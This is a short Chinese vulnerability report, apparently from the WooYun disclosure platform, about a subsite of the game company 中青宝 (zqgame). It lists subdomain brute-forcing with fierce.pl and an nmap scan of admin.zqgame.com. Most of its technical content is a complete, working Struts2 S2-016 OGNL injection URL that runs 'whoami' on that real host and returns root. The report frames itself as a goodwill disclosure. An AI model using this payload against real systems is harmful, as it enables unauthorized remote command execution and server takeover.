中青宝某分站仍为struts2框架 再次杀入内网
善意测试 点到为止

详细说明：

漏洞同 http://wooyun.org/bugs/wooyun-2013-045257 一样

但非同一站点

使用fierce.pl爆破中青宝二级域名

发现敏感域名 

admin.zqgame.com





Nmap下 

root@magicbox:/pentest/database/sqlmap# nmap -sS -sV -Pn admin.zqgame.com





http://admin.zqgame.com:9009/

发现struts2框架

经测试存在s2-016漏洞

http://admin.zqgame.com:9009/login?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27whoami%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}



当前用户为root
